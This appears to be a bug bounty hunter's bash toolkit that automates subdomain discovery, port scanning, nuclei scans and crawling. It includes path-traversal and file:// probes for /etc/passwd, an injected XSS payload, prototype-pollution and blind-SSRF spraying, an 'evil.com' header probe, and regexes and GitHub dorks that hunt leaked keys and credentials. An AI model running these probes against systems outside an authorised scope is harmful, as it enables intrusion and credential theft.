## VARIABLES
ResultsPath="$HOME/Recon"
ToolsPath="$HOME/Tools"
ConfigFolder="$HOME/tools/config"
GITHUB_TOKENS=${ToolsPath}/.github_tokens
certspotter() {
  curl -s https://certspotter.com/api/v0/certs\?domain\=$1 | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u | grep $1
}

crtsh() {
  curl -s https://crt.sh/?q=%.$1 | sed 's/<\/\?[^>]\+>//g' | grep $1
}
cert() {
  curl -s "https://crt.sh/?q=%.$1&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | anew
}
certnmap() {
  curl https://certspotter.com/api/v0/certs\?domain\=$1 | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u | grep $1 | nmap -T5 -Pn -sS -i - -$
}

ipinfo() {
  curl http://ipinfo.io/$1
}
workspaceRecon() {
  name=$(echo $1 | unfurl -u domains)
  wdir=$name/$(date +%F)/
  mkdir -p $wdir
  cd $wdir
  echo $name | anew domains
}

# Use the output of this to make .scope files for checkscope
getscope() {
  mkdir scope
  rescope --burp -u $1 -o scope/burpscope.json
  rescope --zap --name inscope -u $1 -o scope/zapscope.context
}

getfreshresolvers() {
  dnsvalidator -tL https://public-dns.info/nameservers.txt -threads 20 -o ~/tools/lists/my-lists/resolvers
}

ReconRedbull(){
  naabu -l clean.subdomains -top-ports 100 -silent -sa -o naabuScan
  httpx -l naabuScan -silent -status-code -tech-detect -title -timeout 60 -threads 100 -o HTTPOK
  cat HTTPOK | grep 200 | awk -F " " '{print $1}' | anew 200HTTP
  cat HTTPOK | grep -E '40[0-4]' | grep -Ev 404 | awk -F " " '{print $1}' | anew 403HTTP
  cat HTTPOK | grep -v 404 | awk '{print $1}' | anew Without404
  cat HTTPOK | awk -F " " '{print $1}' | anew ALLHTTP
  dnsrecords
  nucauto
}

newRecon(){
  subdomainenum
  [ -s "asn" ] && cat asn | metabigor net --asn | anew cidr
  [ -s "cidr" ] && cat cidr | anew clean.subdomains
  naabu -l clean.subdomains -top-ports 100 -silent -sa -o naabuScan
  [ -s "naabuScan" ] && cat naabuScan | anew clean.subdomains
  httpx -l clean.subdomains -silent -status-code -tech-detect -title -timeout 60 -threads 100 -o HTTPOK
  cat HTTPOK | grep 200 | awk -F " " '{print $1}' | anew 200HTTP
  cat HTTPOK | grep -E '40[0-4]' | grep -Ev 404 | awk -F " " '{print $1}' | anew 403HTTP
  cat HTTPOK | grep -v 404 | awk '{print $1}' | anew Without404
  cat HTTPOK | awk -F " " '{print $1}' | anew ALLHTTP
  dnsrecords
  graphqldetect
  swaggerdetect
  ssrfdetect
  XssScan
  OpenRedirectScan
  nucauto
}

secrets () {

        echo "[ + ] Checking for basic auth..."
        grep -HnriEo 'basic [a-zA-Z0-9=:+/-]{5,100}'

        echo "[ + ] Checking for Google Cloud or Maps Api..."
        grep -HnriEo 'AIza[0-9A-Za-z\-]{35}'

        echo "[ + ] Checking Slack webhooks..."
        grep -HnriEo 'https://hooks.slack.com/services/T[a-zA-Z0-9]{8}/B[a-zA-Z0-9]{8}/[a-zA-Z0-9]{24}'

        echo "[ + ] Checking Aws Access Key..."
        grep -HnriEo 'AKIA[0-9A-Z]{16}'

        echo "[ + ] Checking Bearer auth..."
        grep -HnriEo 'bearer [a-zA-Z0-9\-\.=]+'

        echo "[ + ] Checking Cloudinary auth key..."
        grep -HnriEo 'cloudinary://[0-9]{15}:[0-9A-Za-z]+@[a-z]+'

        echo "[ + ] Checking Mailgun api key..."
        grep -HnriEo 'key-[0-9a-zA-Z]{32}'

        echo "[ + ] Checking for Api key parameters..."
        grep -HnriEo "(api_key|API_KEY)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}"
        grep -HnriEo "(api-key|API-KEY)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}"
        grep -HnriEo "(apikey|APIKEY)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}"

        echo "[ + ] Checking for access keys..."
        grep -HnriEo "(access_key|ACCESS_KEY)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}"

        echo "[ + ] Checking for access token..."
        grep -HnriEo "(access_token|ACCESSTOKEN)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}"

        echo "[ + ] Checking for Bearer Token..."
        grep -HnriEo 'bearer [a-zA-Z0-9-.=:_+/]{5,100}'

        echo "[ + ] Checking for auth token..."
        grep -HnriEo "(auth_token|AUTH_TOKEN)"

        echo "[ + ] Checking for slack api..."
        grep -HnriEo "(slack_api|SLACK_API)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}"

        echo "[ + ] Checking for db password or username..."
        grep -HnriEo "(db_password|DB_PASSWORD)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}"
        grep -HnriEo "(db_username|DB_USERNAME)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}"

        echo "[ + ] Checking for authorization tokens..."
        grep -HnriEo "(authorizationToken|AUTHORIZATIONTOKEN)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}"

        echo "[ + ] Checking for app key ..."
        grep -HnriEo "(app_key|APPKEY)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}"

        echo "[ + ] Checking for authorization ..."
        grep -HnriEo "(authorization|AUTHORIZATION)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}"

        echo "[ + ] Checking for authentication ..."
        grep -HnriEo "(authentication|AUTHENTICATION)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}"

        echo "[ + ] Checking for aws links, buckets and secrets..."
        grep -HnriEo "(.{8}[A-z0-9-].amazonaws.com/)[A-z0-9-].{6}"
        grep -HnriEo "(.{8}[A-z0-9-].s3.amazonaws.com/)[A-z0-9-].{6}"
        grep -HnriEo "(.{8}[A-z0-9-].s3-amazonaws.com/)[A-z0-9_-].{6}"
        grep -HnriEo 'amzn.mws.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'
        grep -HnriEo "(amazonaws|AMAZONAWS)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}"
        grep -HnriEo "(?i)aws(.{0,20})?(?-i)['\"][0-9a-zA-Z/+]{40}['\"]"

}

## findomain
subdomainenum() {
  echo "[+] Recon subdomains..."
  Domain=$(cat domains)
  subfinder -nW -t 100 -all -o subfinder.subdomains -dL domains
  cat subfinder.subdomains | anew all.subdomains
  rm -f subfinder.subdomains
  amass enum -v -norecursive -passive -nf all.subdomains -df domains -o amass.subdomains
  cat amass.subdomains | anew all.subdomains
  rm -f amass.subdomains
  curl -s "https://crt.sh/?q=%25.$Domain&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | anew all.subdomains
  crobat -s domains | anew all.subdomains
  cat all.subdomains | dnsx -silent | anew clean.subdomains
  echo "[+] subdomain recon completed :)"
}

checkscope() {
  cat sorted.all.subdomains | inscope | tee -a inscope.sorted.all.subdomains
}

###################################
# Learn how amass gets both ipv4&6
# use massdns instead
####################################
resolving() {
  shuffledns -d domains -list sorted.all.subdomains -r ~/tools/lists/my-lists/resolvers -o resolved.subdomains
}

getalive() {
  # sperate http and https compare if http doest have or redirect to https put in seperate file
  # compare if you go to https if it automaticly redirects to https if not when does it in the page if never
  echo "[+] Check live hosts"
  cat clean.subdomains | httpx -silent -status-code -tech-detect -timeout 10 -threads 10 -o HTTPOK
  cat HTTPOK | grep 200 | awk -F " " '{print $1}' | anew 200HTTP
  cat HTTPOK | grep -E '40[0-4]' | grep -Ev 404 | awk -F " " '{print $1}' | anew 403HTTP
  cat HTTPOK | grep -v 404 | awk '{print $1}' | anew Without404
  cat HTTPOK | awk -F " " '{print $1}' | anew ALLHTTP
}

# see this example on https://github.com/pdelteil/BugBountyHuntingScripts/blob/main/bbrf_helper.sh
# thanks for this

bbrfAddDomainsAndUrls() {
    for p in $(bbrf programs); do
        bbrf scope in -p "$p" | \
        subfinder -silent | \
        dnsx -silent | \
        bbrf domain add - -s subfinder --show-new -p "$p" | \
        grep -v DEBUG | notify -silent
        
        bbrf urls -p "$p" | httpx -silent | bbrf url add - -s httpx --show-new -p "$p" | \
        grep -v DEBUG | notify -silent
    done
}
bbrfresolvedomains() {
    for p in $(bbrf programs); do
        bbrf domains --view unresolved -p $p | \
        dnsx -silent -a -resp | tr -d '[]' | tee \
            >(awk '{print $1":"$2}' | bbrf domain update - -p $p -s dnsx) \
            >(awk '{print $1":"$2}' | bbrf domain add - -p $p -s dnsx) \
            >(awk '{print $2":"$1}' | bbrf ip add - -p $p -s dnsx) \
            >(awk '{print $2":"$1}' | bbrf ip update - -p $p -s dnsx)
    done
}
# TODO: alterar para usar o match do httpx
nginxpath() {
    echo "Test nginx path traversal" | notify -silent
    ffuf -c -w ALLHTTP -u FUZZ////////../../../../../etc/passwd -mr "root:x" -or -o nginxpath.txt
    [ -s "nginxpath.txt" ] && echo 'nginx traversal found' | notify -silent
    [ -s "nginxpath.txt" ] && cat nginxpath.txt | notify -silent
}

# TODO: alterar para usar o match do httpx
geojson() {
    echo "Test geojson redirect" | notify -silent 
    ffuf -c -w ALLHTTP -u FUZZ/api/geojson?url=file:///etc/passwd -mr "root:x" -or -o geojson.txt
    [ -s "geojson.txt" ] && echo "geojson redirect found" | notify -silent
    [ -s "geojson.txt" ] && cat geojson.txt | notify -silent
}

# TODO: alterar para usar o match do httpx
textinjection() {
    echo "Test text injection" | notify -silent
    ffuf -c -w ALLHTTP -u FUZZ///example.com -mr 'Cannot GET' -or -o textinjection.txt
    [ -s "textinjection.txt" ] && echo "text injection found" | notify -silent
    [ -s "textinjection.txt" ] && cat textinjection.txt | notify -silent
}
getaliveAxiom() {
  # sperate http and https compare if http doest have or redirect to https put in seperate file
  # compare if you go to https if it automaticly redirects to https if not when does it in the page if never
  echo "[+] Check live hosts"
  axiom-scan clean.subdomains -m httpx -silent -status-code -mc 200,401,403 -o HTTPOK -ports 80,81,443,591,2082,2087,2095,2096,3000,8000,8001,8008,8080,8083,8443,8834,8888
  cat HTTPOK | grep 200 | awk -F " " '{print $1}' | anew 200HTTP
  cat HTTPOK | grep -E '40[0-4]' | grep -Ev 404 | awk -F " " '{print $1}' | anew 403HTTP
}
getdata() {
  echo "[+] Get all responses and save on roots folder"
  cat ALLHTTP | fff -d 50 -S -o AllHttpData
}

graphqldetect() {
  echo "[+] Graphql Detect"
  cat ALLHTTP | nuclei -tags graphql -o graphqldetect
  [ -s "graphqldetect" ] && echo "Graphql endpoint found :)" | notify -silent -id api
  [ -s "graphqldetect" ] && cat graphqldetect | notify -silent -id api
}

ssrfdetect() {
  echo "[+] SSRF Detect"
  cat ALLHTTP | nuclei -tags ssrf -o ssrfdetect
  [ -s "ssrfdetect" ] && echo "SSRF vector found :)" | notify -silent -id nuclei
  [ -s "ssrfdetect" ] && cat ssrfdetect | notify -silent -id nuclei
}

XssScan() {
  echo "[+] XSS scan"
  cat ALLHTTP | nuclei -tags xss -es info -o xssvector
  [ -s "xssvector" ] && echo "XSS vector found :)" | notify -silent -id xss
  [ -s "xssvector" ] && cat xssvector | notify -silent -id xss
}

OpenRedirectScan() {
  echo "[+] OpenRedirect scan"
  cat ALLHTTP | nuclei -tags redirect -es info -o openredirectVector
  [ -s "openredirectVector" ] && echo "OpenRedirect vector found :)" | notify -silent -id nuclei
  [ -s "openredirectVector" ] && cat openredirectVector | notify -silent -id nuclei
}

swaggerdetect() {
  echo "[+] Swagger Detect"
  [ -s "ALLHTTP" ] && cat ALLHTTP | nuclei -tags swagger -o swaggerNuclei
  [ -s "swaggerNuclei" ] && echo "Swagger endpoint found :)" | notify -silent -id api
  [ -s "swaggerNuclei" ] && cat swaggerNuclei | notify -silent -id api
}

prototypefuzz() {
  echo "Prototype FUZZ" | notify -silent -id subs
  cat ALLHTTP | sed 's/$/\/?__proto__[testparam]=exploit\//' | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE" | grep -v "NOT" | notify -silent
}
subtakeover() {
  echo "test for posible subdomain-takeover"
  python3 $ToolsPath/takeover/takeover.py -l clean.subdomains -o subtakeover.txt -k -v -t 50
  [ -s "subtakeover.txt" ] && cat subtakeover.txt | notify -silent -id subs
}

gitexposed() {
  echo "Probe gitexposed"
  echo "Init gitexposed probe" | notify -silent -id subs
  [ -s "ALLHTTP" ] && cat ALLHTTP | unfurl domains | anew -q gitexpprobe
  [ -s "gitexpprobe" ] && python3 $ToolsPath/GitTools/Finder/gitfinder.py -i gitexpprobe -o gitexpresult
  [ -s "gitexpresult" ] && cat gitexpresult | notify -silent -id subs
}
##########################################################
# use massdns
# use dns history to check for possible domain takeover
##########################################################
dnsrecords() {
  echo "[+] Get dnshistory data"
  mkdir dnshistory
  cat clean.subdomains | dnsx -silent -a -resp-only -o dnsx.txt
  cat clean.subdomains | dnsx -a -resp -silent -o dnshistory/A-records
  cat clean.subdomains | dnsx -ns -resp -silent -o dnshistory/NS-records
  cat clean.subdomains | dnsx -cname -resp -silent -o dnshistory/CNAME-records
  cat clean.subdomains | dnsx -soa -resp -silent -o dnshistory/SOA-records
  cat clean.subdomains | dnsx -ptr -resp -silent -o dnshistory/PTR-records
  cat clean.subdomains | dnsx -mx -resp -silent -o dnshistory/MX-records
  cat clean.subdomains | dnsx -txt -resp -silent -o dnshistory/TXT-records
  cat clean.subdomains | dnsx -aaaa -resp -silent -o dnshistory/AAAA-records
}

screenshot() {
  echo "[+] Begin screenshots"
  cat ALLHTTP | aquatone -chrome-path /snap/bin/chromium -scan-timeout 900 -http-timeout 6000 -out aqua_out -ports xlarge
}

scanner() {
  # do udp scan as well
  # can't decide weither to put -p0-65535 or --top-ports 1000
  sudo ~/tools/masscan/bin/masscan -p0-65535 --open --rate 100000 --wait 0 -iL ipv4.ipaddresses -oX masscan.xml --exclude 255.255.255.255
  sudo rm paused.conf
  open_ports=$(cat masscan.xml | grep portid | cut -d "\"" -f 10 | sort -n | uniq | paste -sd,)
  cat masscan.xml | grep portid | cut -d "\"" -f 4 | sort -V | uniq >>nmap_targets.tmp

  sudo nmap -sVC -p $open_ports -v -Pn -n -T4 -iL nmap_targets.tmp -oX nmap.ipv4.xml
  sudo rm nmap_targets.tmp
  xsltproc -o nmap-native.ipv4.html nmap.ipv4.xml
  #  xsltproc -o nmap-bootstrap.ipv4.html bootstrap-nmap.xsl nmap.ipv4.xml

  [ -f ipv6.ipaddresses ] && sudo nmap -sSV --top-ports 1000 -Pn -n -iL ipv6.ipaddresses -oX nmap.ipv6.xml &&
    xsltproc -o nmap-native.ipv6.html nmap.ipv6.xml
}

getrobots() {
  cat hosts | while read line; do
    python3 ~/tools/waybackrobots.py $line
  done
  cat *-robots.txt | cut -c -2 | sort -u >>wayback-data/robots.paths.wobs
}

crawler() {
  echo 'Crawler in action :)'
  Domain=$(cat domains)
  mdkir -p .tmp
  gospider -S Without404 -d 10 -c 20 -t 50 -K 3 --no-redirect --js -a -w --blacklist ".(eot|jpg|jpeg|gif|css|tif|tiff|png|ttf|otf|woff|woff2|ico|svg|txt)" --include-subs -q -o .tmp/gospider 2> /dev/null | anew -q .tmp/gospider.list
    xargs -a Without404 -P 50 -I % bash -c "echo % | waybackurls" 2> /dev/null | anew -q .tmp/waybackurls.list
    xargs -a Without404 -P 50 -I % bash -c "echo % | gau --blacklist eot,jpg,jpeg,gif,css,tif,tiff,png,ttf,otf,woff,woff2,ico,svg,txt --retries 3 --threads 50" 2> /dev/null | anew -q .tmp/gau.list 2> /dev/null &> /dev/null
    cat .tmp/gospider.list .tmp/gau.list .tmp/waybackurls.list 2> /dev/null | sed '/\[/d' | grep $Domain | sort -u | uro | anew -q crawlerResults.txt
}

xsshunter() {
  
  echo "INIT XSS HUNTER" | notify -silent -id xss
  echo "INIT XSS HUNTER"
  # python3 $HOME/Tools/xnLinkFinder/xnLinkFinder.py -vv -d 2 -i 200HTTP -sp 200HTTP -sf domains -o urldump.txt
  for domain in $(cat domains)
  do
    python3 $HOME/Tools/Waymore/waymore.py -i $domain -mode U
    cat $HOME/Tools/Waymore/results/$domain/waymore.txt | anew urldump.txt
  done
  [ -s "urldump.txt" ] && cat urldump.txt | uro | kxss | awk '{print $9}' | anew filtered_urls.txt
  [ -s "urldump.txt" ] && cat urldump.txt | uro | gf xss | httpx -silent | anew filtered_urls.txt
  # [ -s "filtered_urls.txt" ] && dalfox file filtered_urls.txt --skip-bav -o XSSresult
  # [ -s "XSSresult" ] && cat XSSresult | notify -id xss
    echo '[+] Freq xss'
  [ -s "filtered_urls.txt" ] && cat filtered_urls.txt | qsreplace '"><img src=x onerror=alert(document.domain);>' | freq | egrep -v 'Not' | anew FreqXSS.txt
  [ -s "FreqXSS.txt" ] && cat FreqXSS.txt | notify -silent -id xss
}
bypass4xx() {
  [ -s "403HTTP" ] && cat 403HTTP | dirdar -only-ok | anew dirdarResult.txt
  [ -s "dirdarResult.txt" ] && cat dirdarResult.txt | sed -e '1,12d' | sed '/^$/d' | anew 4xxbypass.txt | notify -silent -id subs
}

paramspider() {
  xargs -a ALLHTTP -I@ sh -c 'python3 /root/Tools/ParamSpider/paramspider.py -d @ -l high --exclude jpg,png,gif,woff,css,js,svg,woff2,ttf,eot,json'
  cat output/http:/*.txt | anew params
  cat output/https:/*.txt | anew params
}
xssknox(){
  [ -s "waybackdata" ] && cat waybackdata | uro | kxss | awk '{print $9}' | anew kxssresult
  [ -s "kxssresult" ] && python3 $HOME/Tools/knoxnl/knoxnl.py -i kxssresult -s -o xssSuccess
  [ -s "xssSuccess" ] && echo "XSS FOUND WITH KNOXSS" | notify -silent -id xss
  [ -s "xssSuccess" ] && cat xssSuccess | notify -silent -id xss
 }

scanPortsAndNuclei(){
  echo '[+] Recon Blocks Mapcidr'
  mapcidr -l dnsx.txt -silent -aggregate -o mapcidr.txt

  echo '[+] Recon Naabu'
  naabu -l mapcidr.txt -top-ports 100 -silent -sa | httpx -silent -timeout 60 -threads 100 -o naabuIP.txt

  #echo [+] Enumerate dns Mapcidr
  #cat dnsxdomains.txt | mapcidr -aggregate -o mapcidr.txt

  echo '[+] Enumerate httpx nuclei'
  cat naabuIP.txt | nuclei -silent -o nuclei.txt -severity low,medium,high,critical
  [ -s "nuclei.txt" ] && cat nuclei.txt | notify -silent -id nuclei 
}
massHakip2host(){
  echo "[+] Mass HakIP2host"
  Domain=$(cat domain)
  rush -i mapcidr.txt "prips {} | hakip2host | anew hakip2hostResult.txt"
  [ -s "hakip2hostResult.txt" ] && cat "hakip2hostResult.txt" | grep $Domain | awk '{print $3}'  | anew cleanHakipResult.txt
}

nucauto() {
  [ -s "cleanHakipResult.txt" ] && cat "cleanHakipResult.txt" | httpx -silent | anew ALLHTTP
  rm -rf ~/nuclei-templates
  cd
  git clone https://github.com/projectdiscovery/nuclei-templates.git
  cd -
  cat ALLHTTP | nuclei -etags redirect,xss,ssrf,graphql,swagger -severity critical,high,medium,low -o resultNuclei 
  [ -s "resultNuclei" ] && cat resultNuclei | notify -silent -id nuclei
}
faviconEnum(){
  echo '[+] Enumerate FavFreak'
  cat 200HTTP | python3 /root/Tools/FavFreak/favfreak.py --shodan -o outputFavFreak
}

getjsurls() {
  echo "[+]Get JS and test live endpoints"
  cat full_url_extract.txt | grep $Domain | grep -Ei "\.(js)" | grep -iEv '(\.jsp|\.json)' | anew -q url_extract_js.txt
  cat url_extract_js.txt | cut -d '?' -f 1 | grep -Ei "\.(js)" | grep -iEv '(\.jsp|\.json)' | grep $Domain | anew -q jsfile_links.txt
  cat ALLHTTP | subjs | grep $Domain | anew -q jsfile_links.txt
  cat ALLHTTP | getJS --complete | grep $Domain | anew -q jsfile_links.txt
  cat jsfile_links.txt | httpx -follow-redirects -random-agent -silent -status-code -retries 2 -no-color | grep 200 | grep -v 301 | cut -d " " -f 1 | anew -q js_livelinks.txt
  cat js_livelinks.txt | fff -d 1 -S -o JSroots
}

getjsdata() {
  [ -s "js_livelinks.txt" ] && cat js_livelinks.txt | nuclei -tags exposure,token -o jsinfo
  [ -s "jsinfo" ] && cat jsinfo | notify -silent -id nuclei
}
getjspaths() {
  cat alive.js.urls | while read line; do
    ruby $HOME/tools/relative-url-extractor/extract.rb $line | tee -a js.extracted.paths
    python3 ~/tools/LinkFinder/linkfinder.py -i $line -o cli | tee -a js.extracted.paths
  done

  cat hosts | hakrawler -linkfinder | tee -a js.extracted.paths
  sort -u js.extracted.paths -o sorted.js.paths
  rm -f js.extracted.paths
  cat sorted.js.paths | cut -c 2- | sort -u >>sorted.js.paths.wobs
}

secretfinder() {
  echo '[+] Run secretfinder'
  regexs=$(curl -s 'https://gist.githubusercontent.com/mswell/1070fae0021b08d5e5650743ea402b4b/raw/589e669dec183009f01eca2c2ef1401b5f77af2b/regexJS' | tr '\n' '|')
  rush -i js_livelinks.txt 'python3 /root/Tools/SecretFinder/SecretFinder.py -i {} -o cli -r "\w+($regexs)\w+" | grep -v custom_regex | anew js_secrets_result'
  cat js_secrets_result | grep -v custom_regex | grep -iv '[URL]:' | anew JSPathNoUrl
  cat JSPathNoUrl | python3 /root/Tools/BBTz/collector.py JSOutput
}
jsep() {
  mkdir scripts
  mkdir scriptsresponse
  mkdir endpoints
  mkdir responsebody
  mkdir headers
  response() {
    echo "Gathering Response"
    for x in $(cat hosts); do
      NAME=$(echo $x | awk -F/ '{print $3}')
      curl -X GET -H "X-Forwarded-For: evil.com" $x -I >"headers/$NAME"
      curl -s -X GET -H "X-Forwarded-For: evil.com" -L $x >"responsebody/$NAME"
    done
  }

  jsfinder() {
    echo "Gathering JS Files"
    for x in $(ls "responsebody"); do
      printf "\n\n${RED}$x${NC}\n\n"
      END_POINTS=$(cat "responsebody/$x" | grep -Eoi "src=\"[^>]+></script>" | cut -d '"' -f 2)
      for end_point in $END_POINTS; do
        len=$(echo $end_point | grep "http" | wc -c)
        mkdir "scriptsresponse/$x/" >/dev/null 2>&1
        URL=$end_point
        if [ $len == 0 ]; then
          URL="https://$x$end_point"
        fi
        file=$(basename $end_point)
        curl -X GET $URL -L >"scriptsresponse/$x/$file"
        echo $URL >>"scripts/$x"
      done
    done
  }

  endpoints() {
    echo "Gathering Endpoints"
    for domain in $(ls scriptsresponse); do
      #looping through files in each domain
      mkdir endpoints/$domain
      for file in $(ls scriptsresponse/$domain); do
        ruby ~/tools/relative-url-extractor/extract.rb scriptsresponse/$domain/$file >>endpoints/$domain/$file
      done
    done
  }
  response
  jsfinder
  endpoints

  cat endpoints/*/* | sort -u | tee -a endpoints.txt
}
#getcms(){
#  cmsmap webanalyzer cmseek builtwith whatweb wappalyze
#}

#check4wafs(){
#  wafwoof
#  identYwaf
#}

## ffuf, gobuster, meg
#bf-jspaths
#bf-wayback
#bf-quick
#bf-mylist
#bf-custom

#bf-params(){
# arjun parameth aron photon
#}

fullreconAxiom() {
  echo "[+] START RECON AT $(cat domain)" | notify -silent
  subdomainenum
  getaliveAxiom
  getdata
  dnsrecords
  bypass4xx
  Corstest
  crawler
  getjsurls
  getjsdata
  paramspider
  screenshot
  nucauto
  echo "[+] END RECON AT $(cat domain)" | notify -silent
}

fullrecon() {
  echo "[+] START RECON AT $(cat domain)" | notify -silent -id tel
  #  getscope
  # rapid7search
  subdomainenum
  #subdomain-brute
  #resolving
  # checkscope
  getalive
  # geojson
  # nginxpath
  # textinjection
  getdata
  screenshot
  dnsrecords
  graphqldetect
  prototypefuzz
  subtakeover
  gitexposed
  bypass4xx
  scanPortsAndNuclei
  massHakip2host
  nucauto
  crawler
  xsshunter
  faviconEnum
  #Corstest
  getjsurls
  getjsdata
  secretfinder
  # paramspider
  #  scanner
  #  waybackrecon
  #  smuggling
  #  getjspaths
  #  nuc
  #  getcms
  #  check4wafs
  #  bruteforce
  echo "[+] END RECON AT $(cat domain)" | notify -silent -id tel
}

redUrl() {
  gau -subs $1 | grep "redirect" >>$1_redirectall.txt | gau -subs $1 | grep "redirect=" >>$1_redirectequal.txt | gau -subs $1 | grep "url" >>$1_urlall.txt | gau -subs $1 | grep "url=" >>$1_urlequal.txt | gau -subs $1 | grep "next=" >>$1_next.txt | gau -subs $1 | grep "dest=" >>$1_dest.txt | gau -subs $1 | grep "destination" >>$1_destination.txt | gau -subs $1 | grep "return" >>$1_return.txt | gau -subs $1 | grep "go=" >>$1_go.txt | gau -subs $1 | grep "redirect_uri" >>$1_redirecturi.txt | gau -subs $1 | grep "continue=" >>$1_continue.txt | gau -subs $1 | grep "return_path=" >>$1_path.txt | gau -subs $1 | grep "externalLink=" >>$1_link.txt | gau -subs $1 | grep "URL=" >>$1_URL.txt
}

blindssrftest() {
  if [ -z "$1" ]; then
    echo >&2 "ERROR: Domain not set"
    exit 2
  fi
  if [ -z "$2" ]; then
    echo >&2 "ERROR: Sever link not set"
    exit 2
  fi
  if [ -f wayback-data/waybackurls ] && [ -f crawler.urls ]; then
    cat wayack-data/waybackurls crawler.urls | sort -u | grep "?" | qsreplace -a | qsreplace $2 >$1-bssrf
    sed -i "s|$|\&dest=$2\&redirect=$2\&uri=$2\&path=$2\&continue=$2\&url=$2\&window=$2\&next=$2\&data=$2\&reference=$2\&site=$2\&html=$2\&val=$2\&validate=$2\&domain=$2\&callback=$2\&return=$2\&page=$2\&feed=$2\&host=$2&\port=$2\&to=$2\&out=$2\&view=$2\&dir=$2\&show=$2\&navigation=$2\&open=$2|g" $1-bssrf
    echo "Firing the requests - check your server for potential callbacks"
    ffuf -w $1-bssrf -u FUZZ -t 50
  fi
}
Corstest() {
  gf cors roots | awk -F '/' '{print $2}' | anew | httpx -silent -o CORSHTTP
  [ -s "CORSHTTP" ] && python3 /root/Tools/CORStest/corstest.py CORSHTTP -q | notify -silent
}

smuggling() {
  cat hosts | rush -j 3 "python3 $ToolsPath/smuggler/smuggler.py -u {}" | tee -a smuggler_op.txt
}

nuc() {
  mkdir nuclei_op

  nuclei -l hosts cves/ -c 60 -pbar -o nuclei_op/cves.txt
  nuclei -l hosts dns/ -c 60 -pbar -o nuclei_op/dns.txt
  nuclei -l hosts subdomain-takeover/ -c 60 -pbar -o nuclei_op/subdomain-takeover.txt
  nuclei -l hosts files/ -c 60 -pbar -o nuclei_op/files.txt
  nuclei -l hosts panels/ -c 60 -pbar -o nuclei_op/panels.txt
  nuclei -l hosts security-misconfiguration/ -c 60 -pbar -o nuclei_op/security-misconfiguration.txt
  nuclei -l hosts tokens/ -c 60 -pbar -o nuclei_op/tokens.txt
  nuclei -l hosts vulnerabilities/ -c 60 -pbar -o nuclei_op/vulnerabilities.txt
  nuclei -l hosts default-credentials/ -c 60 -pbar -o nuclei_op/default-credentials.txt
}

nucaxiom() {
  axiom-scan 200HTTP -m nuclei -t /root/nuclei-templates -severity critical,high,medium,low -o resultNuclei
  [ -s resultNuclei ] && cat resultNuclei | notify -silent
}
nucautoMedium() {
  nuclei -ut
  cat 200HTTP | nuclei -c 60 -t /root/nuclei-templates/ -severity medium,low | notify -silent
}
## must already be login to github
# this is part of jhaddix hunter.sh script
github_dorks() {
  if [ "$#" -ne 1 ]; then
    echo "${red}Usage: domain_github_dorks <domains>${reset}"
    return
  fi
  host=$1
  without_suffix=$(awk -F '.' '{print $1}' host)
  echo ""
  echo "************ Github Dork Links (must be logged in) *******************"
  echo ""
  echo "  password"
  echo "https://github.com/search?q=%22$1%22+password&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+password&type=Code"
  echo ""
  echo " npmrc _auth"
  echo "https://github.com/search?q=%22$1%22+npmrc%20_auth&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+npmrc%20_auth&type=Code"
  echo ""
  echo " dockercfg"
  echo "https://github.com/search?q=%22$1%22+dockercfg&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+dockercfg&type=Code"
  echo ""
  echo " pem private"
  echo "https://github.com/search?q=%22$1%22+pem%20private&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+extension:pem%20private&type=Code"
  echo ""
  echo "  id_rsa"
  echo "https://github.com/search?q=%22$1%22+id_rsa&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+id_rsa&type=Code"
  echo ""
  echo " aws_access_key_id"
  echo "https://github.com/search?q=%22$1%22+aws_access_key_id&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+aws_access_key_id&type=Code"
  echo ""
  echo " s3cfg"
  echo "https://github.com/search?q=%22$1%22+s3cfg&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+s3cfg&type=Code"
  echo ""
  echo " htpasswd"
  echo "https://github.com/search?q=%22$1%22+htpasswd&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+htpasswd&type=Code"
  echo ""
  echo " git-credentials"
  echo "https://github.com/search?q=%22$1%22+git-credentials&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+git-credentials&type=Code"
  echo ""
  echo " bashrc password"
  echo "https://github.com/search?q=%22$1%22+bashrc%20password&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+bashrc%20password&type=Code"
  echo ""
  echo " sshd_config"
  echo "https://github.com/search?q=%22$1%22+sshd_config&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+sshd_config&type=Code"
  echo ""
  echo " xoxp OR xoxb OR xoxa"
  echo "https://github.com/search?q=%22$1%22+xoxp%20OR%20xoxb%20OR%20xoxa&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+xoxp%20OR%20xoxb&type=Code"
  echo ""
  echo " SECRET_KEY"
  echo "https://github.com/search?q=%22$1%22+SECRET_KEY&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+SECRET_KEY&type=Code"
  echo ""
